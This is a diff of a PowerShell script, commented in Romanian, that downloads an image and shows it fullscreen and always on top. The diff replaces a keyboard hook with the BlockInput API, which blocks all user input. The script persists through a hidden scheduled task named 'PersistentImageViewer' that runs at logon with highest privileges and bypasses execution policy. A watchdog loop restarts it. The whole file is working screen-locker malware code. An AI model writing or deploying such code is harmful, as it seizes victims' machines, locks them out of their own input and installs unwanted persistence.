@@ -2,7 +2,7 @@
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\cdr.png"
 
-# Funcție de descărcare imagine
+# Descărcare imagine
 function Download-Image {
     try {
         Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
@@ -12,7 +12,7 @@ function Download-Image {
     }
 }
 
-# Funcție pentru afișarea imaginii pe tot ecranul
+# Afișare imagine pe tot ecranul
 function Show-FullScreenImage {
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Drawing
@@ -21,11 +21,12 @@ function Show-FullScreenImage {
     $form.WindowState = 'Maximized'
     $form.FormBorderStyle = 'None'
     $form.TopMost = $true
+    $form.KeyPreview = $true
 
     try {
         $img = [System.Drawing.Image]::FromFile($tempImagePath)
     } catch {
-        Write-Host "Eroare la încărcarea imaginii. Verificați descărcarea." -ForegroundColor Red
+        Write-Host "Eroare la încărcarea imaginii." -ForegroundColor Red
         exit
     }
 
@@ -44,54 +45,29 @@ function Show-FullScreenImage {
         }
     }
 
+    $form.Add_Shown({ $form.Activate() })
     $form.ShowDialog()
 }
 
 # Blochează tastele critice
 function Block-Keys {
-    Add-Type @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class InterceptKeys {
-        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-        [DllImport("user32.dll")]
-        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-        [DllImport("user32.dll")]
-        public static extern bool UnhookWindowsHookEx(IntPtr hhk);
-        [DllImport("user32.dll")]
-        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-        public const int WH_KEYBOARD_LL = 13;
-        public const int WM_KEYDOWN = 0x0100;
-        public const int WM_SYSKEYDOWN = 0x0104;
-    }
-"@
-
-    $global:hookId = [InterceptKeys]::SetWindowsHookEx(
-        [InterceptKeys]::WH_KEYBOARD_LL,
-        {
-            param($nCode, $wParam, $lParam)
-            if ($nCode -ge 0 -and ($wParam -eq [InterceptKeys]::WM_KEYDOWN -or $wParam -eq [InterceptKeys]::WM_SYSKEYDOWN)) {
-                $key = [System.Runtime.InteropServices.Marshal]::ReadInt32($lParam)
-                # Blochează tastele critice
-                if ($key -in 9, 18, 27, 91, 17) {
-                    return [IntPtr]::Zero
-                }
-            }
-            return [InterceptKeys]::CallNextHookEx($null, $nCode, $wParam, $lParam)
-        },
-        [IntPtr]::Zero,
-        0
-    )
+    $filter = "[DllImport('user32.dll')] public static extern int BlockInput(bool fBlockIt);"
+    Add-Type -MemberDefinition $filter -Namespace Win32 -Name NativeMethods
+    [Win32.NativeMethods]::BlockInput($true)
 }
 
-# Oprește complet toate instanțele scriptului
+# Deblochează tastele
+function Unblock-Keys {
+    $filter = "[DllImport('user32.dll')] public static extern int BlockInput(bool fBlockIt);"
+    Add-Type -MemberDefinition $filter -Namespace Win32 -Name NativeMethods
+    [Win32.NativeMethods]::BlockInput($false)
+}
+
+# Oprește complet scriptul și elimină sarcina din Task Scheduler
 function Stop-All {
-    Get-Process powershell -ErrorAction SilentlyContinue | ForEach-Object {
-        if ($_ -and $_.MainWindowTitle -eq "PowerShell") {
-            Stop-Process -Id $_.Id -Force
-        }
-    }
+    Unblock-Keys
     schtasks /delete /tn "PersistentImageViewer" /f | Out-Null
+    Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Stop-Process -Force
     exit
 }
 
@@ -102,20 +78,21 @@ function Set-Startup {
     schtasks /create /tn $taskName /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File '$scriptPath'" /sc onlogon /rl highest /f | Out-Null
 }
 
-# Monitorizare persistentă
+# Monitorizare proces pentru repornire automată
 function Monitor-Process {
     while ($true) {
         if (-not (Get-Process -Id $pid -ErrorAction SilentlyContinue)) {
-            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$MyInvocation.MyCommand.Path'" -WindowStyle Hidden
+            Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$MyInvocation.MyCommand.Path`"" -WindowStyle Hidden
             exit
         }
         Start-Sleep -Seconds 1
     }
 }
 
-# Executare funcționalități
+# Descărcare imagine și inițializare
 Download-Image
 Set-Startup
 Start-Job -ScriptBlock { Monitor-Process }
-Start-Job -ScriptBlock { Block-Keys }
+Block-Keys
 Show-FullScreenImage
+Unblock-Keys
